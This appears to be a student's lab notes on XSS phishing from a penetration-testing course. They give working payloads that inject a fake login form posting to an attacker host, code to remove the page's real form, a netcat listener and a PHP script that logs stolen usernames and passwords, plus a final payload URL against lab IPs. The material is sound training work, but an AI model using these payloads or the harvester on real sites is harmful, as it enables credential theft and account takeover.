- Another **very common type of XSS attack is a phishing attack**. 
- Phishing attacks usually utilize l**egitimate-looking information to trick the victims into sending their sensitive information** to the attacker.
- A common form of XSS phishing attacks is through **injecting fake login forms that send the login details to the attacker's server**, which may then be used to log in on behalf of the victim and gain control over their account and sensitive information.

# XSS Discovery
---
- When we visit the website, we see that it is a **simple online image viewer, where we can input a URL of an image**, and it'll display it:
	- ![[Pasted image 20251029055412.png]]
- This ==**form of image viewers is **common in online forums and similar web applications.**==
- As we have **control over the URL, we can start by using the basic XSS payload** we've been using.
	- ![[Pasted image 20251029055456.png]]
- But when we try that payload, we see that nothing gets executed, **and we get the `dead image url` icon**
- So, **==we must run the XSS Discovery process we previously learned to find a working XSS payload.==** 
	- `Before you continue, try to find an XSS payload that successfully executes JavaScript code on the page`.

# Login Form Injection
---
- Once we identify a working XSS payload, we can proceed to the phishing attack
- To perform an XSS phishing attack, **we must inject HTML code that displays a login form on the targeted page.**
- We can **easily find HTML code for a basic login form, or we can write our own login form**. The following example should present a login form:
  
```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```
- We will l**ater be listening on this IP to retrieve the credentials sent from the form**. The login form should look as follows:

```html
<div>
<h3>Please login to continue</h3>
<input type="text" placeholder="Username">
<input type="text" placeholder="Password">
<input type="submit" value="Login">
<br><br>
</div>
```

- Next, **we should prepare our XSS code and test it on the vulnerable form**.
- To **write HTML code to the vulnerable page, we can use the JavaScript function `document.write()`,** and use it in the **XSS payload we found earlier in the XSS Discovery step.**
- Once **we minify our HTML code into a single line and add it inside the `write` function, the final JavaScript code should be as follows**:
- ```javascript
  document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
  ```
- We can **now inject this JavaScript code using our XSS payload** (i.e., instead of running the `alert(window.origin)` JavaScript Code).
- In this case, **we are exploiting a `Reflected XSS` vulnerability,** so we can **copy the URL and our XSS payload in its parameters,** as we've done in the `Reflected XSS` section, and the page should look as follows when we visit the malicious URL:
	- ![[Pasted image 20251029060138.png]]
# Cleaning Up
---
- We can **see that the URL field is still displayed, which defeats our line of "`Please login to continue`"**. 
- So, to **encourage the victim to use the login form, we should remove the URL field,** such that **they may think that they have to log in to be able to use the page**.
- To do so, **we can use the JavaScript function** `document.getElementById().remove()` function.
- To find the `id` of the HTML element we want to remove, we can open the `Page Inspector Picker` by clicking [`CTRL+SHIFT+C`] and then clicking on the element we need.
- A**s we see in both the source code and the hover text, the `url` form** has the id `urlform`:
	- ![[Pasted image 20251029060249.png]]
- So, we can **now use this id with the `remove()` function to remove the URL form**:
	- `document.getElementById('urlform').remove();`
	
- We also see that **there's still a piece of the original HTML code left after our injected login form.** This can be removed by simply commenting it out, by adding an HTML opening comment after our XSS payload:
	- `...PAYLOAD... <!-- `

- We can use this **new JavaScript code in our payload**:
	- ```js
	  document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
	  ```

# Credential Stealing
---
- Let us **start a simple `netcat` server** and see what kind of request we get when someone attempts to log in through the form. 
- To do so, we can **start listening on port 80** in our Pwnbox, as follows:
	- `sudo nc -lvnp 80`
- ![[Pasted image 20251029060417.png]]

- However, **==as we are only listening with a `netcat` listener, it will not handle the HTTP request correctly==**, and the victim **would get an `Unable to connect` error, which may raise some suspicions**
- So, **==we can use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page==** without any injections.
- In this case, the victim may think that they successfully logged in and will use the Image Viewer as intended.
- The **following PHP script should do what we need, and we will write it to a file on our VM that we'll call `index.php` and place it in `/tmp/tmpserver/`:
	- ```php
	  <?php
		if (isset($_GET['username']) && isset($_GET['password'])) {
		    $file = fopen("creds.txt", "a+");
		    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
		    header("Location: http://SERVER_IP/phishing/index.php");
		    fclose($file);
		    exit();
		}
		?>
	  ```
	- Now that we have our `index.php` file ready, **we can start a `PHP` listening server, which we can use instead of the basic `netcat` listener** we used earlier:
		- `mkdir /tmp/tmpserver`
		- `cd /tmp/tmpserver`
		- `vi index.php #at this step we wrote our index.php file`
		- `sudo php -S 0.0.0.0:80`
	- ![[Pasted image 20251029060605.png]]

# Assesment
---
- Manually found the payload by examining the page source:
	- `http://10.129.234.166/phishing/index.php?url='><script>  document.write('<h3>Please login to continue</h3><form action=http://10.10.15.204><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--`
- Copy the php file and server
- Send the URL on:
	- `http://10.129.234.166/phishing/send.php`